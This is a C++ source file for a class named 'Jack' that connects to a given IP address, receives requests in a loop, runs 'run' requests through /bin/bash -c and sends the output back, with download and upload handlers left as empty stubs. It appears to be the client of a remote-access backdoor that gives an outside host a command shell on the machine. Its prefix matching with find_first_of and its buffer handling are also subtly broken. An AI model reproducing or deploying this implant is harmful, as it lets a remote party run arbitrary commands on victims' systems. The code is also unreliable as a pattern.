#include "Jack.hpp"

#include "JackCommunicate.hpp"

#include <sstream>
#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>

bool Jack::m_jack_should_stop = false;

void Jack::execute(const std::string& ip)
{
	JackCommunicate comm(ip);
	while (!m_jack_should_stop) {
		std::string request = comm.get_request();
		if (request.empty())
			continue;
		// get command index
		std::string response;
		const std::string run_command = "run";
		const std::string download_command = "download";
		const std::string upload_command = "upload";
		if (request.find_first_of(run_command) == 0) {
			response = run_shell(request.substr(run_command.length() + 1));
			std::cout << "run shell"<< std::endl;
		}
		else if (request.find_first_of(download_command) == 0) {

		}
		else if (request.find_first_of(upload_command) == 0) {
			//std::istringstream request_stream(request);
			//std::string path;
			//std::getline(request_stream, path);
			//int file_fd = open(path.data(), O_WRONLY | O_CREAT);
			//close(file_fd);
		}
		// switch case, send to the relevent command the rest of the configutaion
		
		comm.send_response(response);
	}
}

void Jack::stop() 
{
	m_jack_should_stop = true;
}

std::string Jack::run_shell(const std::string& command)
{
	int pfds[2];
	pipe(pfds);
	int pid = fork();
	if(pid == 0)
	{
		//close stdout
		close(1);
		dup(pfds[1]);
		close(pfds[0]);
		close(pfds[1]);
		execl("/bin/bash", "/bin/bash", "-c", command.data(), NULL);
	}
	//wait for child process to end
	close(pfds[1]);
	wait(nullptr);
	std::string buffer(100, '\0');
	while (read(pfds[0], const_cast<char*>(buffer.data()) + buffer.find('\0') , buffer.length() - buffer.find('\0'))) {
		buffer.resize(buffer.length() + 100);
	}
	close(pfds[0]);

	return buffer;
}
